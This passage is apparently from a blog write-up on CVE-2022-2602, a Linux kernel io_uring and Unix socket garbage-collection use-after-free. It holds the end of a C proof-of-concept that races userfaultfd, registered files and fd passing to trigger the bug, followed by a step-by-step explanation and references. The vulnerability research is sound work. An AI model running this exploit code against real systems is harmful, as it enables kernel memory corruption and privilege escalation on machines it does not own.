	int rfd[32];
	int s[2];
	int backup_fd;

	struct iovec *iov;
	iov = (void *) buffer;
	iov->iov_base = "hello, world!\n";
	iov->iov_len = 14;

	ufd = userfaultfd(0);
	if (ufd < 0)
		err(1, "userfaultfd");
	start_ufd(ufd);

	if ((manager = fork()) == 0) {
		fault_manager(ufd);
		exit(0);
	}
	close(ufd);

	socketpair(AF_UNIX, SOCK_DGRAM, 0, s);

	params = malloc(sizeof(*params));
	memset(params, 0, sizeof(*params));
	params->flags = IORING_SETUP_SQPOLL;
	fd = io_uring_setup(32, params);

	rfd[0] = s[1];
	rfd[1] = open("null", O_RDWR | O_CREAT | O_TRUNC, 0644);
	io_uring_register(fd, IORING_REGISTER_FILES, rfd, 2);
	close(rfd[1]);

	sendfd(s[0], fd);

	close(s[0]);
	close(s[1]);

	prepare_request(fd, params, &ring);
	io_uring_submit(&ring);

	io_uring_queue_exit(&ring);

	sleep(1);

	close(socket(AF_UNIX, SOCK_DGRAM, 0));

	wait(NULL);
	wait(NULL);

	return 0;
} 
```

This POC does exactly what i have described in the last section.

**Step 1** : It setups a page fault handler with **userfaultfd** in order to pause a thread and give time for the race condition
```c
	ufd = userfaultfd(0);
	if (ufd < 0)
		err(1, "userfaultfd");
	start_ufd(ufd);

	if ((manager = fork()) == 0) {
		fault_manager(ufd);
		exit(0);
	}
	close(ufd);
```

**Step 2** : Initates a io_uring context, creates a socketpair and opens a random file, and registers them in the ring's context.
```c
	socketpair(AF_UNIX, SOCK_DGRAM, 0, s);

	params = malloc(sizeof(*params));
	memset(params, 0, sizeof(*params));
	params->flags = IORING_SETUP_SQPOLL;
	fd = io_uring_setup(32, params);

	rfd[0] = s[1];
	rfd[1] = open("null", O_RDWR | O_CREAT | O_TRUNC, 0644);
	io_uring_register(fd, IORING_REGISTER_FILES, rfd, 2);
	close(rfd[1]);
```

**Step 3** : Sending the ring's fd from s[0] to s[1]. This puts the ring's `struct file` into `s[1]`'s receiving queue. \
This will make this file->f_count increase by, and its `inflight` by one, thus having `f_count` = 2 and `inflight = 1`. \
At last, closing both sockets before accepting the sent fd, which would decrement ref_count and inflight to 1 and 0 respectively. But, this step makes file's `refcount` and `inflight` stay at 2 and 1. 

```c
	sendfd(s[0], fd);

	close(s[0]);
	close(s[1]);
```

**Step 4** : Sumbitting a write request into the registered file, with a zero-page demand as source. This will cause a pagefault which handled with **userfaultfd** as mentionned. \
and `io_uring_queue_exit` will decrease the refcount of ring's file to 1, thus having its `f_count == inflight == 1` which makes it a candidate for the garbage collector.

```c
	prepare_request(fd, params, &ring);
	io_uring_submit(&ring);

	io_uring_queue_exit(&ring);
```

**Step 5** : Triggering the GC \
The GC can be triggered in two ways:
- `wait_for_unix_gc` is invoked at the beginning of the `sendmsg` function if there are more than 16,000 inflight sockets.
- When a socket file is released by the kernel (i.e., a file descriptor is closed), the kernel will directly invoke `unix_gc`.

So, here, the second options is chosen.
```c
	close(socket(AF_UNIX, SOCK_DGRAM, 0));
```

For this vulnerabilty, an exploit already exists using `usefauldfd`. As i said in the beginning, i am working on an alternative one using **FUSE** which i am hopefully releasing soon.


## Resources


https://exploiter.dev/blog/2022/CVE-2022-2602.html \
https://man7.org/linux/man-pages/man7/io_uring.7.html \
https://kernel.dk/io_uring.pdf \
https://seclists.org/oss-sec/2022/q4/57?utm_source=dlvr.it&utm_medium=twitter
